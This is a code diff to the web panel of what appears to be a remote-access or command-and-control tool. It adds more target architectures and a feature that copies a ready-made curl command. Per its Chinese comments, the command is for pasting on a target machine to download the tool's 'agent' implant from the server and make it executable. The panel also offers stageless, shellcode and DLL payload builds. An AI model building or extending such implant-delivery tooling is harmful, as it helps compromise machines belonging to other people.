@@ -1,6 +1,6 @@
 <script setup lang="ts">
 import { onMounted, reactive, ref } from 'vue'
-import { ElMessage } from 'element-plus'
+import { ElMessage, ElMessageBox } from 'element-plus'
 import { listenerApi, type ListenerItem } from '../api'
 import { downloadURL } from '../api/http'
 
@@ -8,7 +8,7 @@ const listeners = ref<ListenerItem[]>([])
 const form = reactive({ id: 0, arch: 'windows_amd64', tp: 'tcp', host: '127.0.0.1', port: 4444,
   vkey: '', salt: '', upx: false, proxy: '' })
 
-const arches = ['windows_amd64', 'windows_386', 'linux_amd64', 'linux_arm64', 'darwin_amd64']
+const arches = ['windows_amd64', 'windows_386', 'linux_amd64', 'linux_386', 'linux_arm64', 'linux_arm', 'darwin_amd64', 'darwin_arm64']
 
 async function load() {
   const res = await listenerApi.list()
@@ -16,6 +16,28 @@ async function load() {
   if (!form.id && listeners.value.length) form.id = listeners.value[0].Id
 }
 onMounted(load)
+
+// 生成"在目标机上直接拉取"的命令（比浏览器下载更实用：可直接贴到 shell 里）
+function fetchCommand(kind: 'stageless' | 'listen'): string | null {
+  if (kind === 'stageless' && !form.id) { ElMessage.warning('先选择监听器'); return null }
+  const url = kind === 'stageless'
+    ? downloadURL('/download/stageless', { id: form.id, arch: form.arch, upx: String(form.upx), proxy: form.proxy })
+    : downloadURL('/download/listen', { arch: form.arch, tp: form.tp, host: form.host,
+        port: form.port, vkey: form.vkey, salt: form.salt, upx: String(form.upx) })
+  return `curl -sSL '${url}' -o agent.${form.arch.includes('windows') ? 'exe' : 'bin'} && chmod +x agent.*`
+}
+
+async function copyCommand(kind: 'stageless' | 'listen') {
+  const cmd = fetchCommand(kind)
+  if (!cmd) return
+  try {
+    await navigator.clipboard.writeText(cmd)
+    ElMessage.success('命令已复制')
+  } catch {
+    // 非 https / 无剪贴板权限时回退：选一个只读输入框让用户手动复制
+    ElMessageBox.alert(cmd, '复制失败，请手动复制', { confirmButtonText: '知道了' })
+  }
+}
 
 function download(kind: 'stageless' | 'stage' | 'listen' | 'shellcode' | 'dll' | 'listendll') {
   if (!form.id) return ElMessage.warning('先选择监听器')
@@ -81,6 +103,11 @@ function download(kind: 'stageless' | 'stage' | 'listen' | 'shellcode' | 'dll' |
         <el-button @click="download('dll')">DLL</el-button>
         <el-button @click="download('listen')">Listen（独立）</el-button>
         <el-button @click="download('listendll')">ListenDLL</el-button>
+      </div>
+      <el-divider />
+      <div class="toolbar" style="flex-wrap: wrap">
+        <el-button @click="copyCommand('stageless')">复制 stageless 拉取命令</el-button>
+        <el-button @click="copyCommand('listen')">复制 listen 拉取命令</el-button>
       </div>
       <el-alert type="info" :closable="false" style="margin-top: 12px"
         title="服务端从 stageless|dll/<tp>_<arch> 读取模板；模板缺失会返回 open …: file does not exist。" />
